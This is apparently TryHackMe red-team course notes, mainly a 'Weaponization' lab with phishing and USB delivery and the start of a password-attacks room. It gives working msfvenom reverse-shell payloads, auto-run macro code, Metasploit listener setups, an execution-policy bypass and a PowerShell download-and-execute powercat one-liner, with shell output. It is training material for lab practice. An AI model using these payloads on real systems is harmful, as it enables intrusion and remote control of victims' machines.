![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3d05e45bd6021ca651892542b06f4230.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3d05e45bd6021ca651892542b06f4230.png)

The above two examples should give you an idea of the workflow using 
Maltego. You can observe that all the work is based on transforms, and 
Maltego will help you keep your graph organized. You would get the same 
results by querying the different online websites and databases; 
however, Maltego helps you get all the information you need with a few 
clicks.

We experimented with `whois` and `nslookup` in a previous task. You get plenty of information, from names and email addresses to IP addresses. The results of `whois` and `nslookup`
 are shown visually in the following Maltego graph. Interestingly, 
Maltego transforms were able to extract and arrange the information 
returned from the WHOIS database. Although the returned email addresses 
are not helpful due to privacy protection, it is worth seeing how 
Maltego can extract such information and how it's presented.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c54a869cffca4d657f46dac618cc9135.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c54a869cffca4d657f46dac618cc9135.png)

Now that we have learned how Maltego’s power stems from its 
transforms, the only logical thing is to make Maltego more powerful by 
adding new Transforms. Transforms are usually grouped into different 
categories based on data type, pricing, and target audience. Although 
many transforms can be used using Maltego Community Edition and free 
transforms, other transforms require a paid subscription. A screenshot 
is shown below to give a clearer idea.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/adc8ab512edcf6fef5414d434d7577a1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/adc8ab512edcf6fef5414d434d7577a1.png)

## **WEAPONIZATION**

**Introduction**

In this room, we will be discussing different techniques used for weaponization.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/126ff098c0efeeeb8ab694a09b3359b0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/126ff098c0efeeeb8ab694a09b3359b0.png)

# What is Weaponization

Weaponization
 is the second stage of the Cyber Kill Chain model. In this stage, the 
attacker generates and develops their own malicious code using 
deliverable payloads such as word documents, PDFs, etc. [[1](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)]. The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.

Most organizations have Windows OS running, which is going to be a
 likely target. An organization's environment policy often blocks 
downloading and executing .exe files
 to avoid security violations. Therefore, red teamers rely upon building
 custom payloads sent via various channels such as phishing campaigns, 
social engineering, browser or software exploitation, USB, or web 
methods.

The following graph is an example of weaponization, where a 
crafted custom PDF or Microsoft Office document is used to deliver a 
malicious payload. The custom payload is configured to connect back to 
the command and control environment of the red team infrastructure.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png)

For more information about red team toolkits, please visit the following: a [GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development) that has it all, including initial access, payload development, delivery methods, and others.

Most organizations block or monitor the execution of .exe files
 within their controlled environment. For that reason, red teamers rely 
on executing payloads using other techniques, such as built-in windows 
scripting technologies. Therefore, this task focuses on various popular 
and effective scripting techniques, including:

- The Windows Script Host (WSH)
- An HTML Application (HTA)
- Visual Basic Applications (VBA)
- PowerShell (PSH)

# Windows Scripting Host (WSH)

Windows
 scripting host is a built-in Windows administration tool that runs 
batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript).
 It is important to note that the VBScript engine on a Windows operating
 system runs and executes applications with the same level of access and
 permission as a regular user; therefore, it is useful for the red 
teamers.

Now let's write a simple VBScript code to create a windows message box that shows the Welcome to THM message. Make sure to save the following code into a file, for example, hello.vbs.

```jsx
Dim message
message = "Welcome to THM"
MsgBox message
```

In the first line, we declared the message variable using Dim. Then we store a string value of Welcome to THM in the message variable.
 In the next line, we use the MsgBox function to show the content of the
 variable. For more information about the MsgBox function, please visit [here](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN). Then, we use wscript to run and execute the content of hello.vbs. As a result, A Windows message will pop up with the Welcome to THM message.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png)

Now let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the Windows native engine (WSH).

```jsx
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

We create an object of the WScript library using CreateObject to call the execution payload. Then, we utilize the Run method to execute the payload. For this task, we will run the Windows calculator calc.exe.

To execute the vbs file, we can run it using the wscript as follows,

Terminal

```
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

We can also run it via cscript as follows,

Terminal

```
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```

As a result, the Windows calculator will appear on the Desktop.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png)

Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,

Terminal

```
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

The result will be as exact as executing the vbs files, which run the calc.exe binary.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png)

# An HTML Application (HTA)

HTA
 stands for “HTML Application.” It allows you to create a downloadable 
file that takes all the information regarding how it is displayed and 
rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.

In the following example, we will use an [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX) in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.

```jsx
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>

```

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,

Terminal

```
user@machine$ python3 -m http.server 8090Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

On the victim machine, visit the malicious link using Microsoft Edge, http://10.8.232.37:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png)

Once we press Run, the payload.hta gets executed, and then it will invoke the cmd.exe. The following figure shows that we have successfully executed the cmd.exe.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png)

**HTA Reverse Connection**

We can create a reverse shell payload as follows,

Terminal

```
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

We use the msfvenom from the Metasploit framework
 to generate a malicious payload to connect back to the attacking 
machine. We used the following payload to connect the windows/x64/shell_reverse_tcp to our IP and listening port.

On the attacking machine, we need to listen to the port 443 using nc. Please note this port needs root privileges to open, or you can use different ones.

Once the victim visits the malicious URL and hits run, we get the connection back.

Terminal

```
user@machine$ sudo nc -lvp 443listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

# Malicious HTA via Metasploit

There
 is another way to generate and serve malicious HTA files using the 
Metasploit framework. First, run the Metasploit framework using msfconsole -q command. Under the exploit section, there is exploit/windows/misc/hta_server, which requires selecting and setting information such as LHOST, LPORT, SRVHOST, Payload, and finally, executing exploit to run the module.

Terminal

```
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.

```

On the victim machine, once we visit the
 malicious HTA file that was provided as a URL by Metasploit, we should 
receive a reverse connection.

Terminal

```
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```

# Visual Basic for Application (VBA)

VBA stands for Visual Basic for Applications,
 a programming language by Microsoft implemented for Microsoft 
applications such as Microsoft Word, Excel, PowerPoint, etc. VBA 
programming allows automating tasks of nearly every keyboard and mouse 
interaction between a user and Microsoft Office applications.

Macros
 are Microsoft Office applications that contain embedded code written in
 a programming language known as Visual Basic for Applications (VBA). It
 is used to create custom functions to speed up manual tasks by creating
 automated processes. One of VBA's features is accessing the Windows Application Programming Interface ([API](https://en.wikipedia.org/wiki/Windows_API)) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications).

In
 this task, we will discuss the basics of VBA and the ways the adversary
 uses macros to create malicious Microsoft documents. To follow up along
 with the content of this task, make sure to deploy the attached Windows
 machine in Task 2. When it is ready, it will be available through 
in-browser access.

Now open 
Microsoft Word 2016 from the Start menu. Once it is opened, we close the
 product key window since we will use it within the seven-day trial 
period.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png)

Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png)

Now create a new blank Microsoft document to create our first macro.
 The goal is to discuss the basics of the language and show how to run 
it when a Microsoft Word document gets opened. First, we need to open 
the Visual Basic Editor by selecting view → macros. The Macros window shows to create our own macro within the document.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png)

In the Macro name section, we choose to name our macro as THM. Note that we need to select from the Macros in list Document1 and finally select create.
 Next, the Microsoft Visual Basic for Application editor shows where we 
can write VBA code. Let's try to show a message box with the following 
message: Welcome to Weaponization Room!. We can do that using the MsgBox function as follows:

```jsx
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Finally, run the macro by F5 or Run → Run Sub/UserForm.

Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as AutoOpen and Document_open. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the THM function.

```jsx
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and docm. Now let's save the file as Word 97-2003 Template where the Macro is enabled by going to File → save Document1 and save as type → Word 97-2003 Document and finally, save.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png)

Let's close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been disabled and give us the option to enable it. Let's enable it and move forward to check out the result.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png)

Once we allowed the Enable Content, our macro gets executed as shown,

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png)

Now edit the word document and create a macro function that executes a calc.exe or any executable file as proof of concept as follows,

```jsx
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

To explain the code in detail, with Dim payload As String, we declare payload variable as a string using Dim keyword. With payload = "calc.exe" we are specifying the payload name and finally with CreateObject("Wscript.Shell").Run payload
 we create a Windows Scripting Host (WSH) object and run the payload. 
Note that if you want to rename the function name, then you must include
 the function name in the  AutoOpen() and Document_open() functions too.

Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png)

It
 is important to mention that we can combine VBAs with previously 
covered methods, such as HTAs and WSH. VBAs/macros by themselves do not 
inherently bypass any detections.

Answer the questions below

Now let's create an in-memory 
meterpreter payload using the Metasploit framework to receive a reverse 
shell. First, from the AttackBox, we create our meterpreter payload 
using msfvenom. We need to specify the Payload, LHOST, and LPORT, which match what is in the Metasploit framework. Note that we specify the payload as VBA to use it as a macro.

Terminal

```
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes

```

The value of the LHOST in the above terminal is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.

**Import to note**
 that one modification needs to be done to make this work.  The output 
will be working on an MS excel sheet. Therefore, change the Workbook_Open() to Document_Open() to make it suitable for MS word documents.

Now copy the output and save it into the macro editor of the MS word document, as we showed previously.

From the attacking machine, run the Metasploit framework and set the listener as follows:

Terminal

```
user@AttackBox$ msfconsole -qmsf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.159.15:443

```

Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.

Terminal

```
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.159.15:443
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```

Now replicate and apply what we discussed to get a reverse shell

# PowerShell (PSH)

PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, [Hacking with PowerShell for more information about PowerShell](https://tryhackme.com/room/powershell).

Red
 teamers rely on PowerShell in performing various activities, including 
initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints "Welcome to the Weaponization Room!" as follows,

```powershell
Write-Output "Welcome to the Weaponization Room!"
```

Save the file as thm.ps1. With the Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt. Now let's run it and see the result.

CMD

```
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>

```

# Execution Policy

PowerShell's execution policy is a **security option** to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.

You can determine the current PowerShell setting of your Windows as follows,

CMD

```
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```

We can also easily change the PowerShell execution policy by running:

CMD

```
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

# Bypass Execution Policy

Microsoft
 provides ways to disable this restriction. One of these ways is by 
giving an argument option to the PowerShell command to change it to your
 desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.

In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows,

CMD

```
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.

Terminal

```
user@machine$ git clone https://github.com/besimorhino/powercat.gitCloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
```

Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that
 will be downloaded and executed on the target machine. Next, change the
 directory to powercat and start listening on a port of your choice. In 
our case, we will be using port 8080.

Terminal

```
user@machine$ cd powercatuser@machine$ python3 -m http.server 8080Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim.

Terminal

```
user@machine$ nc -lvp 1337
```

Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,

Terminal

```
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

Now that we have executed the command above, the victim machine downloads the powercat.ps1  payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337. After a couple of seconds, we should receive the connection call back:

Terminal

```
user@machine$ nc -lvp 1337  listening on [any] 1337 ...10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```

**Command And Control - (C2 Or C&C)**

This task introduces the basic concept of Command and Control (C2) frameworks used in Red team operations.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9671adc6cb778fa7b151921f753e2f96.jpg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9671adc6cb778fa7b151921f753e2f96.jpg)

# What is Command and Control (C2)?

C2
 frameworks are post-exploitation frameworks that allow red teamers to 
collaborate and control compromised machines. C2 is considered one of 
the most important tools for red teamers during offensive cyber 
operations.  C2 frameworks provide fast and straightforward approaches 
to:

- Generate various malicious payloads
- Enumerate the compromised machine/networks
- Perform privilege escalation and pivoting
- Lateral movement
- And many others

Some
 popular C2 frameworks that we'll briefly highlight are Cobalt Strike, 
PowerShell Empire, Metasploit. Most of these frameworks aim to support a
 convenient environment to share and communicate between red team operations once the initial access is gained to a system.

# Cobalt Strike

Cobalt
 Strike is a commercial framework that focuses on Adversary Simulations 
and Red Team Operations. It is a combination of remote access tools, 
post-exploitation capabilities, and a unique reporting system. It 
provides an agent with advanced techniques to establish covert 
communications and perform various operations, including key-logging, 
files upload and download, VPN deployment, privilege escalation 
techniques, mimikatz, port scanning, and the most advanced lateral 
movements.

# PowerShell Empire

PowerShell
 Empire is an open-source framework that helps red team operators and 
pen testers collaborate across multiple servers using keys and shared 
passwords. It is an exploitation framework based on PowerShell and 
Python agents. PowerShell Empire focuses on client-side and 
post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: [Empire](https://tryhackme.com/room/rppsempire).

# Metasploit

Metasploit
 is a widely used exploitation framework that offers various techniques 
and tools to perform hacking easily. It is an open-source framework and 
is considered one of the primary tools for pentesting and red team 
operations. Metasploit is one of the tools we use in this room to 
generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest checking the [Metasploit module](https://tryhackme.com/module/metasploit).

Most
 of the C2 frameworks use the techniques mentioned in this room as 
preparation for the initial access stage. For more details about the C2 
framework, we invite you to check the [Intro to C2](https://tryhackme.com/room/introtoc2) room.

### Delivery Techniques

Delivery techniques are one of the important factors for getting 
initial access. They have to look professional, legitimate, and 
convincing to the victim in order to follow through with the content.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/54108dbd9d1c3d64fb86f2ad04b5949e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/54108dbd9d1c3d64fb86f2ad04b5949e.png)

# Email Delivery

It is a common method to use in order to send the payload by sending a
 phishing email with a link or attachment. For more info, visit [here](https://attack.mitre.org/techniques/T1566/001/).
 This method attaches a malicious file that could be the type we 
mentioned earlier. The goal is to convince the victim to visit a 
malicious website or download and run the malicious file to gain initial
 access to the victim's network or host.

The red teamers should have their own infrastructure for phishing 
purposes. Depending on the red team engagement requirement, it requires 
setting up various options within the email server, including DomainKeys
 Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer 
(PTR) record.

The red teamers could also use third-party email services such as 
Google Gmail, Outlook, Yahoo, and others with good reputations.

Another interesting method would be to use a compromised email 
account within a company to send phishing emails within the company or 
to others. The compromised email could be hacked by phishing or by other
 techniques such as password spraying attacks.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/08a3f660501cf5171277534e40aa96b8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/08a3f660501cf5171277534e40aa96b8.png)

### Web Delivery

Another method is hosting malicious payloads on a web server 
controlled by the red teamers. The web server has to follow the security
 guidelines such as a clean record and reputation of its domain name and
 TLS (Transport Layer Security) certificate. For more information, visit
 [here](https://attack.mitre.org/techniques/T1189/).

This method includes other techniques such as social engineering the 
victim to visit or download the malicious file. A URL shortener could be
 helpful when using this method.

In this method, other techniques can be combined and used. The 
attacker can take advantage of zero-day exploits such as exploiting 
vulnerable software like Java or browsers to use them in phishing emails
 or web delivery techniques to gain access to the victim machine.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/ff8ca3c104fa32e30603ecf97ee0d72e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/ff8ca3c104fa32e30603ecf97ee0d72e.png)

### 

# USB Delivery

This
 method requires the victim to plug in the malicious USB physically. 
This method could be effective and useful at conferences or events where
 the adversary can distribute the USB. For more information about USB 
delivery, visit [here](https://attack.mitre.org/techniques/T1091/).

Often,
 organizations establish strong policies such as disabling USB usage 
within their organization environment for security purposes. While other
 organizations allow it in the target environment.

Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), charging USB cable, such as [O.MG Cable](https://shop.hak5.org/products/omg-cable).

## **PASSWORD ATTACKS**

**Introduction**

This
 room is an introduction to the types and techniques used in password 
attacks. We will discuss the ways to get and generate custom password 
lists. The following are some of the topics we will discuss:

- Password profiling
- Password attacks techniques
- Online password attacks

# What is a password?

Passwords are used as an authentication method for individuals to access computer systems or applications. Using
 passwords ensures the owner of the account is the only one who has 
access. However, if the password is shared or falls into the wrong 
hands, unauthorized changes to a given system could occur. Unauthorized 
access could potentially lead to changes in the system's overall status 
and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords!

A
 collection of passwords is often referred to as a dictionary or 
wordlist. Passwords with low complexity that are easy to guess are 
commonly found in various publicly disclosed password data breaches. For
 example, an easy-to-guess password could be password, 123456, 111111, and much more. Here are the [top 100 and most common and seen passwords](https://techlabuzz.com/top-100-most-common-passwords/) for
 your reference. Thus, it won't take long and be too difficult for the 
attacker to run password attacks against the target or service to guess 
the password. Choosing a strong password is a good practice, making it 
hard to guess or crack. Strong passwords should not be common words or 
found in dictionaries as well as the password should be an eight 
characters length at least. It also should contain uppercase and lower 
case letters, numbers, and symbol strings (ex: *&^%$#@).

Sometimes,
 companies have their own password policies and enforce users to follow 
guidelines when creating passwords. This helps ensure users aren't using
 common or weak passwords within their organization and could limit 
attack vectors such as brute-forcing. For example, a password 
length has to be eight characters and more, including characters, a 
couple of numbers, and at least one symbol. However, if the attacker 
figures out the password policy, he could generate a password list that 
satisfies the account password policy.

# How secure are passwords?

Passwords
 are a protection method for accessing online accounts or computer 
systems. Passwords authentication methods are used to access personal 
and private systems, and its main goal of using the password is to keep 
it safe and not share it with others.

To answer the question: How secure are passwords? depends on various factors. Passwords
 are usually stored within the file system or database, and keeping them
 safe is essential. We've seen cases where companies store passwords 
into plaintext documents, such as the [Sony breach](https://www.techdirt.com/articles/20141204/12032329332/shocking-sony-learned-no-password-lessons-after-2011-psn-hack.shtml) in
 2014. Therefore, once an attacker accesses the file system, he can 
easily obtain and reuse these passwords. On the other hand, others store
 passwords within the system using various techniques such as hashing 
functions or encryption algorithms to make them more secure. Even if the
 attacker has to access the system, it will be harder to crack. We will 
cover cracking hashes in the upcoming tasks.

**Password Attacking Techniques**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/767385d2697d4b3f8ff7371a04e4c138.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/767385d2697d4b3f8ff7371a04e4c138.png)

# Password Attack Techniques

In this room, we will discuss the techniques that could be used to perform password attacks. We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks. All
 the above techniques are considered active 'online' attacks where the 
attacker needs to communicate with the target machine to obtain the 
